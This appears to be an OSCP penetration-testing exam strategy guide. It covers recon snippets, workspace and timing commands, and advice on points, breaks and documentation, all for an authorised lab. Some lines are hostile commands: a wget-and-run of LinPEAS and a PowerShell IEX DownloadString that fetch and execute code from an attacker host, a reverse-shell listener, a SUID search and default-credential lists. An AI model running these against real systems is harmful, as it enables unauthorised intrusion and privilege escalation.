# OSCP Exam Strategy

## Start AutoRecon on all targets simultaneously

```bash
autorecon $IP 10.10.10.11 10.10.10.12 10.10.10.13 10.10.10.14
```

## Start AutoRecon on single target

```bash
autorecon $IP
```

## Add target to hosts file

```bash
echo "$IP target1.htb" | sudo tee -a /etc/hosts
```

## Verify VPN connection to exam network

```bash
ip addr show tun0
ping -c 4 $IP
```

## Test reachability of all exam targets

```bash
for ip in $IP 10.10.10.11 10.10.10.12; do ping -c 2 $ip; done
```

## Quick port scan for initial assessment

```bash
nmap -T4 --open -p- $IP
```

## Check running AutoRecon processes

```bash
ps aux | grep autorecon
```

## Kill stuck AutoRecon scan

```bash
pkill -f autorecon
```

## Start timer for time management

```bash
date && echo "Started enumeration of $IP"
```

## Create exam workspace directory structure

```bash
mkdir -p ~/oscp_exam/{machine1,machine2,machine3,machine4}/{screenshots,scans,exploits,flags}
```

## Navigate to machine workspace

```bash
cd ~/oscp_exam/machine1
```

## Take snapshot before major change

```bash
echo "Taking snapshot before privilege escalation attempt"
```

## Document successful exploit command

```bash
echo "[$(date)] Successfully exploited with: python3 exploit.py $IP" >> notes.txt
```

## Log failed attempt for review

```bash
echo "[$(date)] Failed: SQLi on /login.php - no injection point" >> notes.txt
```

## Set 2-hour timer for moving on

```bash
echo "Time check: $(date) - 2 hours on this target, time to switch"
```

## Calculate current exam points

```bash
echo "Points: User1(10) + Root1(10) + User2(10) + Root2(10) = 40 points"
```

## Verify minimum passing points achieved

```bash
echo "Total points: 70+ = PASS"
```

## Quick enumeration time check

```bash
echo "[$(date)] Completed enumeration phase - $(expr $(date +%s) - $START_TIME) seconds"
```

## Monitor long-running scan

```bash
tail -f scans/nmap_full.txt
```

## Start focused service enumeration

```bash
echo "[$(date)] Starting web enumeration on port 80"
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt
```

## Document break time

```bash
echo "[$(date)] Taking mandatory 30-minute break" >> exam_log.txt
```

## Check elapsed exam time

```bash
echo "Exam hours elapsed: $(expr $(expr $(date +%s) - $EXAM_START) / 3600)"
```

## Save working exploit to machine folder

```bash
cp /tmp/exploit.py ~/oscp_exam/machine1/exploits/
```

## Backup all notes and screenshots

```bash
tar -czf ~/oscp_exam_backup_$(date +%Y%m%d_%H%M%S).tar.gz ~/oscp_exam/
```

## Create quick reference for machine

```bash
cat > machine_summary.txt << EOF
Target: $IP
OS: Windows Server 2019
User Flag: /Users/john/Desktop/user.txt
Root Flag: /Users/Administrator/Desktop/proof.txt
Exploit: MS17-010 EternalBlue
EOF
```

## List all captured flags

```bash
find ~/oscp_exam -name "*.txt" -path "*/flags/*" -exec cat {} \;
```

## Start screen session for persistence

```bash
screen -S oscp_exam
```

## Resume screen session after disconnect

```bash
screen -r oscp_exam
```

## Test HTTP server is accessible from target

```bash
python3 -m http.server 80
curl http://10.10.14.5
```

## Verify listener is ready for reverse shell

```bash
nc -nlvp 4444
```

## Quick check of common web directories

```bash
for dir in admin login upload backup; do curl -I http://$IP/$dir; done
```

## Test for low-hanging fruit vulnerabilities

```bash
enum4linux -a $IP
```

## Check for anonymous FTP access

```bash
ftp $IP
# Try: anonymous / anonymous
```

## Test for default credentials on web login

```bash
# admin:admin, admin:password, root:root, admin:admin123
```

## Search for quick privilege escalation vectors

```bash
find / -perm -4000 -type f 2>/dev/null
```

## Upload and run LinPEAS quickly

```bash
wget http://10.10.14.5/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt
```

## Upload and run WinPEAS quickly

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/winPEAS.ps1')
```

## Check if current user has sudo privileges

```bash
sudo -l
```

## Attempt password reuse for privilege escalation

```bash
su root
# Try found passwords
```

## Test for kernel exploit quickly

```bash
uname -a
searchsploit linux kernel $(uname -r)
```

## Set hard stop time for target

```bash
echo "HARD STOP at $(date -d '+4 hours') - must move to next target"
```

## Final 2-hour documentation push

```bash
echo "[$(date)] Entering final documentation phase - no new exploitation"
```

## Organize screenshots by machine

```bash
mv screenshot*.png ~/oscp_exam/machine1/screenshots/
```

## Create final evidence checklist

```bash
cat > evidence_checklist.txt << EOF
Machine 1 ($IP):
- [ ] User flag screenshot
- [ ] Root flag screenshot
- [ ] Hostname verification
- [ ] Whoami proof
- [ ] System info

Machine 2 (10.10.10.11):
- [ ] User flag screenshot
- [ ] Root flag screenshot
- [ ] Hostname verification
- [ ] Whoami proof
- [ ] System info
EOF
```

## Verify all required screenshots exist

```bash
ls -la ~/oscp_exam/*/screenshots/
```

## Count total screenshots collected

```bash
find ~/oscp_exam -name "*.png" | wc -l
```

## Package exam evidence for backup

```bash
tar -czf oscp_final_evidence_$(date +%Y%m%d).tar.gz ~/oscp_exam/
```

## Verify proof.txt content captured

```bash
cat ~/oscp_exam/machine1/flags/proof.txt
```

## Switch to next target immediately

```bash
cd ~/oscp_exam/machine2
autorecon 10.10.10.11
```

## Review what has been tried on stuck target

```bash
cat notes.txt | grep "Failed\|Tried"
```

## Start completely fresh on different target

```bash
cd ~/oscp_exam/machine3
echo "[$(date)] Fresh start on new target" > notes.txt
```

## Calculate time spent on current target

```bash
echo "Time on target: $(expr $(date +%s) - $TARGET_START_TIME) seconds"
```

## Mark target for later return

```bash
echo "RETURN_LATER: Try password spraying with found usernames" >> notes.txt
```

---

## Exam Time Management Philosophy

The OSCP exam is a 24-hour marathon, not a sprint. Success depends more on time management and strategic decision-making than technical skill alone. You must know when to push forward and when to move on.

## Pre-Exam Preparation

Verify your environment is ready the day before. Test VPN connectivity and have backup internet access. Update Kali and verify all tools work. Prepare note-taking system with templates ready. Organize your toolset and scripts. Get adequate sleep. Have food and drinks ready. Set up a comfortable workspace.

## First Hour: Initial Assessment and Triage

Read all machine descriptions carefully and understand point values. Start AutoRecon on all targets simultaneously to maximize time efficiency. While scans run, identify target IPs and add them to /etc/hosts. Take initial screenshot of control panel as proof. Review AutoRecon results as they complete. Identify quick wins like anonymous FTP, default credentials, or obvious vulnerabilities. Start with the easiest-looking target to build confidence and momentum.

## Machine Prioritization Strategy

Focus on achieving 70 points minimum, not 100 points. Easy and medium machines worth 10-20 points should take 3-4 hours each. Hard machines worth 20+ points should take 6-8 hours maximum. Always leave 2-3 hours for final documentation. Multiple user flags are better than chasing one difficult root flag.

## The 2-Hour Rule: Initial Foothold

If you have not gained an initial foothold after 2 hours of focused effort, switch to a different target. Document all attempts thoroughly. Return later with fresh perspective. Tunnel vision is the enemy of time management. The exam provides multiple paths to 70 points.

## The 4-Hour Rule: User Access

If you have not achieved user-level access after 4 hours, seriously consider moving to a different target. Document all findings and attempted exploits. Set a specific time to return if needed. User flags from multiple machines are more valuable than spending excessive time on one difficult target.

## The 6-Hour Rule: Admin/Root Access

If you have not achieved administrator or root access after 6 hours total on one machine, move to the next target immediately. The user flag may be sufficient for passing when combined with other machines. Better to have multiple user flags than spending entire exam on one root flag.

## Enumeration Time Limits

Initial AutoRecon should complete within 15-30 minutes. Web application enumeration should take 45-60 minutes maximum. SMB and Active Directory enumeration should take 30-45 minutes maximum. Database services should take 20-30 minutes maximum. Stop enumerating when you have identified a viable attack vector, found credentials or sensitive information, discovered a known vulnerability with available exploit, or exhausted common attack vectors for that service.

## Break Management is Critical

Take 10 minutes every 2 hours minimum. Take 30 minutes every 4 hours for meals and mental reset. Take a mandatory 1-hour break at the 12-hour mark. Always take eyes completely off the screen during breaks. Physical movement, hydration, and mental reset prevent burnout and tunnel vision.

## Warning Signs You Need a Break

Making the same mistake repeatedly indicates fatigue. Frustration or anger building means you need distance. Tunnel vision on a single approach limits creativity. Physical discomfort like eye strain or back pain reduces effectiveness. Trust these warning signs and take breaks.

## When You Are Stuck: 30-Minute Protocol

Step back and re-read all your notes. Try a different approach from your methodology. Google the specific error or issue. Ask yourself what you might be missing. Sometimes the answer is in information you already have.

## When You Are Stuck: 1-Hour Protocol

Switch to a different machine temporarily. Review your methodology checklist for missed steps. Try manual verification of automated tool results. Consider privilege escalation vectors if you already have user access. Fresh perspective often reveals what you missed.

## When You Are Stuck: 2-Hour Protocol

Take a mandatory 15-30 minute break away from computer. Start completely fresh on a different target. Document everything you have tried in detail. Plan return strategy with specific new approaches to try. This prevents wasting time repeating failed methods.

## Common Time Wasters to Avoid

Complex SQL injection without clear path forward. Buffer overflow attempts which are not on the current exam. Kernel exploits as first approach instead of proper enumeration. Brute forcing without considering rate limiting or account lockout. Waiting for slow automated scans instead of targeted manual testing. Running multiple tools for the same task. Perfectionism in exploitation or documentation during the exam.

## Point Optimization Strategy

Understand minimum viable scenarios. Scenario 1: 70 points from 2 full machines (40 points) plus 1 user flag (10 points) plus 1 admin flag elsewhere (20 points). Scenario 2: 70 points from 3 full machines (60 points) plus 1 user flag (10 points). Calculate whether pursuing difficult admin flag is worth time investment. Multiple easier targets often better than one hard target.

## Documentation During Exam

Screenshot everything important immediately. Copy working commands into templates. Note failed attempts with reasoning for later reference. Timestamp major discoveries. Focus on basic notes during exam, detailed write-up comes after. Screenshots are more important than detailed notes during exploitation phase.

## Final Hours Strategy

With 2 hours remaining, enter triage mode. Stop starting new major attacks. Focus only on low-hanging fruit and quick privilege escalation attempts. Verify point calculations add up to 70 or more.

With 1 hour remaining, enter documentation mode. Stop all exploitation attempts completely. Organize all screenshots properly. Verify all proof.txt contents are captured. Double-check point calculations match evidence.

With 30 minutes remaining, perform final checks. Screenshot final proof if not already done. Backup all documentation to multiple locations. Submit exam attempt through proper channel. Begin mental preparation for report writing phase.

## Contingency Planning

If behind schedule, lower standards to user flags instead of chasing admin flags. Switch targets more aggressively. Use simpler exploitation methods even if less elegant. Focus on known vulnerabilities instead of research.

If ahead of schedule, do not get overconfident and make mistakes. Double-check all documentation is complete. Attempt bonus objectives carefully without risking completed work. Ensure already-obtained flags are properly documented.

## Mental Game and Stress Management

Build confidence by starting with easiest target first. Celebrate every small win because every flag counts toward 70 points. Remember your training and that you have successfully done this before. Trust your methodology because it works.

Deal with frustration by remembering it is normal and everyone experiences it. Take breaks when frustrated. Switch targets for fresh perspective. Focus on process and methodology, not outcome.

Stay motivated by tracking progress visually with points earned. Remember your goal is 70 points, not perfection. Think long-term because this is just one attempt, retakes are allowed. Stay hydrated and fed throughout the exam.

## Post-Exam Priorities

Within 1 hour, screenshot final control panel, backup all documentation, take a well-earned break, and plan report writing schedule.

Within 24 hours, start report writing within 12 hours while memory is fresh. Use screenshots as primary evidence. Follow OffSec template exactly. Proofread everything before final submission.

## The Golden Rules

Time management beats perfect technique. 70 points is the goal, not 100 points. Working solution beats elegant solution every time. Multiple attempts are allowed if needed. Learn from each attempt to improve.

## Final Words

Trust your preparation because you have trained for this. Stay calm because panic leads to poor decisions. Be methodical and let templates guide you. Do not give up because many flags come in the final hours. Thousands have passed before you. You can do this.
